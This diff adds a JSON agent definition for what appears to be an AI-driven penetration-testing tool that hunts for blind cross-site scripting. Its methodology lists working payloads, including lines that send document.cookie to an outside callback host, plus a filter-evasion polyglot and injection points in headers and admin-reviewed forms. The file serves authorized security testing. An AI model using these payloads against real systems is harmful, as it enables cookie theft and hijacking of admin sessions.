@@ -1,0 +1,34 @@
+{
+  "schema_version": 1,
+  "id": "vulns/blind_xss",
+  "version": "1.0.0",
+  "title": "Blind XSS Specialist Agent",
+  "category": "vulns",
+  "modes": [
+    "blackbox",
+    "greybox"
+  ],
+  "cwe": [
+    "CWE-79"
+  ],
+  "owasp": [],
+  "mitre": [],
+  "preconditions": [
+    "Operator scope and runtime capability checks pass"
+  ],
+  "required_observations": [],
+  "permitted_tools": [
+    "http_get",
+    "dns_resolve",
+    "tcp_connect"
+  ],
+  "risk_class": "read_only",
+  "methodology": "# Blind XSS Specialist Agent\n## User Prompt\nYou are testing **{target}** for Blind Cross-Site Scripting (Blind XSS).\n**Recon Context:**\n{recon_json}\n**METHODOLOGY:**\n### 1. Identify Blind XSS Vectors\n- Contact forms, feedback forms, support tickets\n- User-Agent, Referer headers stored in logs/admin panels\n- Profile fields viewed by admin: bio, address, company name\n- Order notes, comments, error reports\n### 2. Payloads (Out-of-Band)\n- `\"><script src=https://your-callback.xss.ht></script>`\n- `\"><img src=x onerror=fetch('https://callback.xss.ht/'+document.cookie)>`\n- `javascript:fetch('https://callback.xss.ht/'+document.cookie)//`\n- Polyglot: `jaVasCript:/*-/*\\`/*\\\\\\`/*'/*\"/**/(/* */oNcliCk=alert())//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e`\n### 3. Delivery Points\n- Headers: `User-Agent`, `Referer`, `X-Forwarded-For`\n- Form fields that admin reviews: name, email, message\n- File names in upload (stored and displayed in admin)\n### 4. Report\n```\nFINDING:\n- Title: Blind XSS via [injection point]\n- Severity: High\n- CWE: CWE-79\n- Injection Point: [field/header]\n- Payload: [XSS payload with callback]\n- Callback Received: [yes/no]\n- Admin Context: [what admin panel triggered it]\n- Impact: Admin session hijacking, backend compromise\n- Remediation: Sanitize all stored input, CSP on admin panels\n```\n## System Prompt\nYou are a Blind XSS specialist. Blind XSS is high severity because it executes in admin/backend contexts. Since you cannot directly observe execution, use out-of-band callbacks. Proof requires callback confirmation OR observation of payload in admin context. Injecting payloads without callback proof is speculative — note it as potential, not confirmed.\n",
+  "validation_procedure": "Submit candidates referencing actual runtime receipts; harness independently replays supported proofs. Unsupported claims require review.",
+  "stopping_conditions": [
+    "Scope rejection, depleted budget, cancellation, or missing permitted capability"
+  ],
+  "output_schema": "candidate/v1",
+  "imported_from": "vulns/blind_xss.md",
+  "warnings": []
+}
